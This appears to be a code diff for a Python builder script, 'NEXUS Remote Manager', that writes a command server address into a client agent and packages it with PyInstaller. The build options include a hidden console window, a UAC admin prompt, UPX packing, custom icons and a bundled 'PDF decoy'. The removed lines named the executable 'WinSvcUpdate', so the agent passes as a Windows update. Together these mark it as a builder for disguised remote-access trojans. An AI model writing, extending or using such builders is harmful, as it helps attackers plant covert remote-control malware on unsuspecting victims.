@@ -1,64 +1,68 @@
 #!/usr/bin/env python3
 """
-All-in-One Remote Management Tool
-Supports both GUI and CLI interfaces based on system capabilities
+NEXUS Remote Manager — Configure, build, and manage agents.
 """
 
-import os
-import sys
-import platform
-import subprocess
-import threading
-import time
-import socket
-import shutil
-import argparse
-import json
+import os, sys, platform, subprocess, threading, time, socket, shutil, argparse, json, re
 from pathlib import Path
 
-def detect_gui_support():
-    """Detect if GUI is available on the system"""
-    system = platform.system().lower()
+CONFIG_FILE = "manager_config.json"
 
-    if system == "windows":
-        # Windows - check if we can import tkinter and have display
-        try:
-            import tkinter
-            root = tkinter.Tk()
-            root.withdraw()
-            root.destroy()
-            return True
-        except:
-            return False
+DEFAULTS = {
+    "server_ip": "127.0.0.1",
+    "server_port": "8080",
+    "output_name": "agent",
+    "console": False,
+    "uac_admin": False,
+    "icon": "",
+    "upx": True,
+    "onefile": True,
+    "use_pdf": False,
+    "pdf_path": "",
+}
 
-    elif system == "linux":
-        # Linux - check for DISPLAY environment variable and tkinter
-        display = os.environ.get('DISPLAY')
-        if not display:
-            return False
-        try:
-            import tkinter
-            root = tkinter.Tk()
-            root.withdraw()
-            root.destroy()
-            return True
-        except:
-            return False
+SPEC_TEMPLATE = """# -*- mode: python ; coding: utf-8 -*-
+a = Analysis(
+    ['{client_file}'],
+    pathex=[],
+    binaries=[],
+    datas={datas},
+    hiddenimports=[],
+    hookspath=[],
+    hooksconfig={{}},
+    runtime_hooks=[],
+    excludes=[],
+    noarchive=False,
+    optimize=0,
+)
+pyz = PYZ(a.pure)
+exe = EXE(
+    pyz,
+    a.scripts,
+    a.binaries,
+    a.datas,
+    [],
+    name='{output_name}',
+    debug=False,
+    bootloader_ignore_signals=False,
+    strip=False,
+    upx={upx},
+    upx_exclude=[],
+    runtime_tmpdir=None,
+    console={console},
+    onefile={onefile},
+    disable_windowed_traceback=False,
+    argv_emulation=False,
+    target_arch=None,
+    codesign_identity=None,
+    entitlements_file=None,
+    {uac_line}
+    {icon_line}
+)
+"""
 
-    elif system == "darwin":  # macOS
-        try:
-            import tkinter
-            root = tkinter.Tk()
-            root.withdraw()
-            root.destroy()
-            return True
-        except:
-            return False
-
-    return False
 
 def get_local_ips():
-    """Get list of local IP addresses"""
     ips = ["0.0.0.0", "127.0.0.1"]
     try:
         for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
@@ -69,374 +73,249 @@ def get_local_ips():
         pass
     return ips
 
-class CLIManager:
-    """Command Line Interface Manager"""
 
+class Manager:
     def __init__(self):
-        self.config = {
-            'server_ip': '127.0.0.1',
-            'server_port': '8080',
-            'icon_path': '',
-            'pdf_path': '',
-            'use_pdf': False
-        }
+        self.config = dict(DEFAULTS)
         self.load_config()
 
     def load_config(self):
-        """Load configuration from file if exists"""
-        config_file = Path('manager_config.json')
-        if config_file.exists():
+        p = Path(CONFIG_FILE)
+        if p.exists():
             try:
-                with open(config_file, 'r') as f:
+                with open(p) as f:
                     self.config.update(json.load(f))
             except:
                 pass
 
     def save_config(self):
-        """Save configuration to file"""
-        try:
-            with open('manager_config.json', 'w') as f:
-                json.dump(self.config, f, indent=2)
-        except:
-            pass
+        with open(CONFIG_FILE, "w") as f:
+            json.dump(self.config, f, indent=2)
+        print("  [+] Config saved")
 
-    def print_banner(self):
-        """Print CLI banner"""
-        print("=" * 60)
-        print("  REMOTE MANAGEMENT TOOL - CLI MODE")
-        print("  All-in-One Configuration & Build System")
-        print("=" * 60)
+    def patch_client(self):
+        src = Path("client.py").read_text(encoding="utf-8")
+        src = re.sub(
+            r'SERVER_IP = os\.environ\.get\("SERVER_IP", "[^"]*"\)',
+            f'SERVER_IP = os.environ.get("SERVER_IP", "{self.config["server_ip"]}")',
+            src,
+        )
+        src = re.sub(
+            r'SERVER_PORT = int\(os\.environ\.get\("SERVER_PORT", os\.environ\.get\("PORT", "[^"]*"\)\)\)',
+            f'SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "{self.config["server_port"]}")))',
+            src,
+        )
+        Path("client.py").write_text(src, encoding="utf-8")
+        print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")
 
-    def print_menu(self):
-        """Print main menu"""
-        print("\nAvailable Commands:")
-        print("1. Configure Server Connection")
-        print("2. Start Server")
-        print("3. Stop Server")
-        print("4. Build Standalone Agent")
-        print("5. Show Current Configuration")
-        print("6. Exit")
-        print()
+    def generate_spec(self):
+        datas = []
+        if self.config.get("use_pdf") and self.config.get("pdf_path"):
+            pdf = self.config["pdf_path"]
+            if os.path.exists(pdf):
+                sep = ";" if platform.system() == "Windows" else ":"
+                datas.append(f"{pdf}{sep}.")
+        datas_str = json.dumps(datas)
 
-    def get_user_choice(self):
-        """Get user menu choice"""
-        while True:
-            try:
-                choice = input("Enter your choice (1-6): ").strip()
-                if choice in ['1', '2', '3', '4', '5', '6']:
-                    return choice
-                print("Invalid choice. Please enter 1-6.")
-            except KeyboardInterrupt:
-                print("\nExiting...")
-                sys.exit(0)
+        uac_line = ""
+        if self.config["uac_admin"]:
+            uac_line = "uac_admin=True,"
+        icon_line = ""
+        if self.config["icon"] and os.path.exists(self.config["icon"]):
+            icon_line = f"icon=[r'{self.config['icon']}'],"
 
-    def configure_connection(self):
-        """Configure server connection settings"""
-        print("\n--- Server Connection Configuration ---")
+        spec = SPEC_TEMPLATE.format(
+            client_file="client.py",
+            output_name=self.config["output_name"],
+            datas=datas_str,
+            upx=str(self.config["upx"]),
+            console=str(self.config["console"]),
+            onefile=str(self.config["onefile"]),
+            uac_line=uac_line,
+            icon_line=icon_line,
+        )
+        spec_file = f"build_{self.config['output_name']}.spec"
+        Path(spec_file).write_text(spec)
+        print(f"  [+] Generated {spec_file}")
+        return spec_file
 
-        # Get available IPs
-        ips = get_local_ips()
-        print(f"Available local IPs: {', '.join(ips)}")
+    def build_agent(self):
+        print("\n--- Building Standalone Agent ---")
+        self.patch_client()
+        spec = self.generate_spec()
+        print("  Running PyInstaller...")
+        cmd = ["pyinstaller", "--noconfirm", spec]
 
-        # Server IP
-        current_ip = self.config.get('server_ip', '127.0.0.1')
-        ip = input(f"Server IP [{current_ip}]: ").strip()
-        if ip:
-            self.config['server_ip'] = ip
-        else:
-            self.config['server_ip'] = current_ip
-
-        # Server Port
-        current_port = str(self.config.get('server_port', '8080'))
-        port = input(f"Server Port [{current_port}]: ").strip()
-        if port:
-            try:
-                int(port)  # Validate port
-                self.config['server_port'] = port
-            except ValueError:
-                print("Invalid port number. Using default.")
-                self.config['server_port'] = current_port
-
-        # Icon path
-        current_icon = self.config.get('icon_path', '')
-        icon = input(f"Icon path (leave empty for none) [{current_icon}]: ").strip()
-        if icon:
-            if os.path.exists(icon):
-                self.config['icon_path'] = icon
+        result = subprocess.run(cmd, capture_output=True, timeout=600)
+        if result.returncode == 0:
+            ext = ".exe" if platform.system() == "Windows" else ""
+            exe_path = os.path.join("dist", self.config["output_name"] + ext)
+            if os.path.exists(exe_path):
+                size = os.path.getsize(exe_path) / 1024 / 1024
+                print(f"  [+] Build OK -> {exe_path} ({size:.1f} MB)")
             else:
-                print("Icon file not found. Keeping current setting.")
-
-        # PDF decoy
-        use_pdf = input(f"Use PDF decoy wrapper? (y/n) [{'y' if self.config.get('use_pdf', False) else 'n'}]: ").strip().lower()
-        if use_pdf in ['y', 'yes']:
-            self.config['use_pdf'] = True
-            current_pdf = self.config.get('pdf_path', '')
-            pdf = input(f"PDF path [{current_pdf}]: ").strip()
-            if pdf:
-                if os.path.exists(pdf):
-                    self.config['pdf_path'] = pdf
-                else:
-                    print("PDF file not found.")
+                print("  [!] Build OK but exe not found in dist/")
         else:
-            self.config['use_pdf'] = False
-
-        self.save_config()
-        print("Configuration saved!")
-
-    def show_configuration(self):
-        """Show current configuration"""
-        print("\n--- Current Configuration ---")
-        print(f"Server IP: {self.config.get('server_ip', '127.0.0.1')}")
-        print(f"Server Port: {self.config.get('server_port', '8080')}")
-        print(f"Icon Path: {self.config.get('icon_path', 'None')}")
-        print(f"PDF Decoy: {'Enabled' if self.config.get('use_pdf', False) else 'Disabled'}")
-        if self.config.get('use_pdf'):
-            print(f"PDF Path: {self.config.get('pdf_path', 'None')}")
+            print("  [X] Build failed:")
+            print(result.stderr.decode()[-1500:])
 
     def start_server(self):
-        """Start the server"""
         print("\n--- Starting Server ---")
-        try:
-            ip = self.config.get('server_ip', '127.0.0.1')
-            port = self.config.get('server_port', '8080')
-
-            # Kill any existing process on the port
-            self.kill_port(port)
-
-            # Set environment variables
-            env = os.environ.copy()
-            env["HOST"] = ip
-            env["PORT"] = port
-
-            print(f"Starting server on {ip}:{port}...")
-            self.server_process = subprocess.Popen(
-                [sys.executable, "server.py"],
-                env=env,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-
-            # Wait a moment and check if it's running
-            time.sleep(2)
-            if self.server_process.poll() is None:
-                print("✅ Server started successfully!")
-                print(f"Dashboard: http://{ip}:{port}")
-            else:
-                stdout, stderr = self.server_process.communicate()
-                print("❌ Failed to start server:")
-                print(stderr)
-
-        except Exception as e:
-            print(f"❌ Error starting server: {e}")
+        ip = self.config["server_ip"]
+        port = self.config["server_port"]
+        self._kill_port(port)
+        env = {**os.environ, "HOST": ip, "PORT": str(port)}
+        p = subprocess.Popen(
+            [sys.executable, "server.py"], env=env,
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+        )
+        time.sleep(2)
+        if p.poll() is None:
+            print(f"  [+] Server running on http://{ip}:{port}")
+        else:
+            _, err = p.communicate()
+            print(f"  [X] Failed: {err.strip()[:500]}")
 
     def stop_server(self):
-        """Stop the server"""
         print("\n--- Stopping Server ---")
-        try:
-            port = self.config.get('server_port', '8080')
-            self.kill_port(port)
-            print("✅ Server stopped!")
-        except Exception as e:
-            print(f"❌ Error stopping server: {e}")
+        self._kill_port(self.config["server_port"])
+        print("  [+] Done")
 
-    def kill_port(self, port):
-        """Kill process on specified port"""
+    def _kill_port(self, port):
         try:
             if platform.system() == "Windows":
-                # Windows
                 out = subprocess.check_output(
                     f'netstat -ano | findstr :{port} | findstr LISTEN',
-                    shell=True, text=True
+                    shell=True, text=True,
                 )
-                for line in out.strip().split('\n'):
+                for line in out.strip().split("\n"):
                     parts = line.split()
                     if parts and parts[-1].isdigit():
-                        subprocess.run(
-                            ["taskkill", "/F", "/PID", parts[-1], "/T"],
-                            capture_output=True
-                        )
-                        print(f"Killed process PID {parts[-1]} on port {port}")
+                        subprocess.run(["taskkill", "/F", "/PID", parts[-1], "/T"],
+                                       capture_output=True)
             else:
-                # Linux/macOS
                 try:
-                    out = subprocess.check_output(
-                        ["lsof", "-ti", f":{port}"],
-                        text=True
-                    )
-                    for pid in out.strip().split('\n'):
+                    out = subprocess.check_output(["lsof", "-ti", f":{port}"], text=True)
+                    for pid in out.strip().split("\n"):
                         if pid:
                             subprocess.run(["kill", "-9", pid])
-                            print(f"Killed process PID {pid} on port {port}")
                 except:
                     pass
         except:
             pass
 
-    def build_agent(self):
-        """Build standalone agent"""
-        print("\n--- Building Standalone Agent ---")
+    def show_menu(self):
+        os.system("cls" if os.name == "nt" else "clear")
+        c = self.config
+        print("=== NEXUS Remote Manager ===\n")
+        items = [
+            ("1", "Server IP", c["server_ip"]),
+            ("2", "Server Port", c["server_port"]),
+            ("3", "Output exe name", c["output_name"]),
+            ("4", "Console window", "Yes" if c["console"] else "No"),
+            ("5", "UAC Admin", "Yes" if c["uac_admin"] else "No"),
+            ("6", "Icon file", c["icon"] or "(none)"),
+            ("7", "UPX compress", "Yes" if c["upx"] else "No"),
+            ("8", "Single file", "Yes" if c["onefile"] else "No"),
+            ("9", "PDF decoy", "Yes" if c["use_pdf"] else "No"),
+        ]
+        for k, label, val in items:
+            print(f"  [{k}] {label:17s} {val}")
+        print(f"\n  [S] Start server    [T] Stop server")
+        print(f"  [B] BUILD agent     [C] Show config")
+        print(f"  [Q] Quit")
+        return input("\n  Choice: ").strip().lower()
 
-        try:
-            ip = self.config.get('server_ip', '127.0.0.1')
-            port = self.config.get('server_port', '8080')
-
-            # Phase 1: Inject configuration
-            print("Phase 1: Injecting configuration...")
-            with open("client.py", "r", encoding="utf-8") as f:
-                code = f.read()
-
-            code = code.replace(
-                'SERVER_IP = os.environ.get("SERVER_IP", "127.0.0.1")',
-                f'SERVER_IP = "{ip}"'
-            )
-            code = code.replace(
-                'SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "8080")))',
-                f'SERVER_PORT = {port}'
-            )
-
-            build_file = "client_build.py"
-            with open(build_file, "w", encoding="utf-8") as f:
-                f.write(code)
-
-            # Phase 2: Build with PyInstaller
-            print("Phase 2: Compiling standalone executable...")
-            cmd = [
-                "pyinstaller",
-                "--onefile",
-                "--noconsole",
-                "--noconfirm",
-                "--clean",
-                "--name", "WinSvcUpdate",
-                build_file
-            ]
-
-            # Add icon if specified
-            icon = self.config.get('icon_path', '')
-            if icon and os.path.exists(icon):
-                cmd.extend(["--icon", icon])
-                print(f"   Using custom icon: {os.path.basename(icon)}")
-
-            # Add PDF if specified
-            if self.config.get('use_pdf', False):
-                pdf = self.config.get('pdf_path', '')
-                if pdf and os.path.exists(pdf):
-                    if platform.system() == "Windows":
-                        cmd.extend(["--add-data", f"{pdf};."])
-                    else:
-                        cmd.extend(["--add-data", f"{pdf}:."])
-                    print(f"   Bundling PDF decoy: {os.path.basename(pdf)}")
-
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
-
-            # Cleanup
-            try:
-                os.remove(build_file)
-            except:
-                pass
-
-            if result.returncode == 0:
-                exe_name = "WinSvcUpdate.exe" if platform.system() == "Windows" else "WinSvcUpdate"
-                exe_path = os.path.join("dist", exe_name)
-
-                if os.path.exists(exe_path):
-                    size_mb = os.path.getsize(exe_path) / 1024 / 1024
-                    print("✅ Build completed successfully!")
-                    print(f"   Output: {exe_path}")
-                    print(f"   Size: {size_mb:.1f} MB")
-                else:
-                    print("❌ Build completed but output file not found")
-            else:
-                print("❌ Build failed:")
-                print(result.stderr[-1000:])  # Last 1000 chars of error
-
-        except Exception as e:
-            print(f"❌ Error during build: {e}")
+    def edit(self, prompt, current=""):
+        v = input(f"  {prompt} [{current}]: ").strip()
+        return v if v else current
 
     def run(self):
-        """Main CLI loop"""
-        self.print_banner()
-
-        # Check if running interactively
-        import sys
-        if not sys.stdin.isatty():
-            print("Non-interactive terminal detected.")
-            print("Use --help for command line options or run interactively.")
-            return
-
         while True:
-            self.print_menu()
-            choice = self.get_user_choice()
-
-            if choice == '1':
-                self.configure_connection()
-            elif choice == '2':
+            ch = self.show_menu()
+            c = self.config
+            if ch == "1":
+                c["server_ip"] = self.edit("Server IP", c["server_ip"])
+            elif ch == "2":
+                c["server_port"] = self.edit("Port", c["server_port"])
+            elif ch == "3":
+                c["output_name"] = self.edit("Output name", c["output_name"])
+            elif ch == "4":
+                c["console"] = not c["console"]
+            elif ch == "5":
+                c["uac_admin"] = not c["uac_admin"]
+            elif ch == "6":
+                v = input(f"  Icon path [{c['icon'] or 'none'}]: ").strip()
+                if v:
+                    if os.path.exists(v):
+                        c["icon"] = v
+                    else:
+                        print("  [!] File not found")
+                else:
+                    c["icon"] = ""
+            elif ch == "7":
+                c["upx"] = not c["upx"]
+            elif ch == "8":
+                c["onefile"] = not c["onefile"]
+            elif ch == "9":
+                c["use_pdf"] = not c["use_pdf"]
+                if c["use_pdf"]:
+                    v = input(f"  PDF path [{c['pdf_path'] or 'none'}]: ").strip()
+                    if v:
+                        if os.path.exists(v):
+                            c["pdf_path"] = v
+                        else:
+                            print("  [!] File not found")
+                    elif not c["pdf_path"]:
+                        c["use_pdf"] = False
+            elif ch == "s":
+                self.save_config()
                 self.start_server()
-            elif choice == '3':
+                input("\n  Press Enter...")
+            elif ch == "t":
                 self.stop_server()
-            elif choice == '4':
+                input("\n  Press Enter...")
+            elif ch == "b":
+                self.save_config()
                 self.build_agent()
-            elif choice == '5':
-                self.show_configuration()
-            elif choice == '6':
-                print("Exiting...")
+                input("\n  Press Enter...")
+            elif ch == "c":
+                print("\n--- Config ---")
+                for k, v in c.items():
+                    print(f"  {k}: {v}")
+                input("\n  Press Enter...")
+            elif ch == "q":
+                self.save_config()
+                print("Bye")
                 break
 
-            input("\nPress Enter to continue...")
 
 def main():
-    """Main entry point"""
-    parser = argparse.ArgumentParser(description='Remote Management Tool')
-    parser.add_argument('--cli', action='store_true', help='Force CLI mode')
-    parser.add_argument('--gui', action='store_true', help='Force GUI mode')
-
+    parser = argparse.ArgumentParser(description="NEXUS Remote Manager")
+    parser.add_argument("--build", metavar="IP:PORT", help="Build agent for IP:PORT and exit")
+    parser.add_argument("--name", default="agent", help="Output exe name (with --build)")
+    parser.add_argument("--console", action="store_true", help="Show console window")
+    parser.add_argument("--uac", action="store_true", help="Request UAC admin")
+    parser.add_argument("--icon", help="Icon .ico file")
     args = parser.parse_args()
 
-    # Determine interface mode
-    use_gui = detect_gui_support()
+    m = Manager()
+    if args.build:
+        if ":" in args.build:
+            ip, port = args.build.split(":", 1)
+            m.config["server_ip"] = ip
+            m.config["server_port"] = port
+        else:
+            m.config["server_ip"] = args.build
+        m.config["output_name"] = args.name
+        m.config["console"] = args.console
+        m.config["uac_admin"] = args.uac
+        if args.icon:
+            m.config["icon"] = args.icon
+        m.build_agent()
+    else:
+        m.run()
 
-    if args.cli:
-        use_gui = False
-    elif args.gui:
-        use_gui = True
-
-    if use_gui:
-        print("GUI detected, launching graphical interface...")
-        try:
-            # Import and run the GUI version
-            import vnc_all_in_one
-            # The GUI will handle its own main loop
-        except ImportError as e:
-            print(f"GUI mode failed: {e}")
-            print("Falling back to CLI mode...")
-            use_gui = False
-        except Exception as e:
-            print(f"GUI mode error: {e}")
-            print("Falling back to CLI mode...")
-            use_gui = False
-
-    if not use_gui:
-        print("Using command-line interface...")
-        cli_manager = CLIManager()
-        cli_manager.run()
-        print("GUI detected, launching graphical interface...")
-        try:
-            # Import and run the GUI version
-            import vnc_all_in_one
-            # The GUI will handle its own main loop
-        except ImportError as e:
-            print(f"GUI mode failed: {e}")
-            print("Falling back to CLI mode...")
-            use_gui = False
-        except Exception as e:
-            print(f"GUI mode error: {e}")
-            print("Falling back to CLI mode...")
-            use_gui = False
-
-    if not use_gui:
-        print("Using command-line interface...")
-        cli_manager = CLIManager()
-        cli_manager.run()
 
 if __name__ == "__main__":
     main()
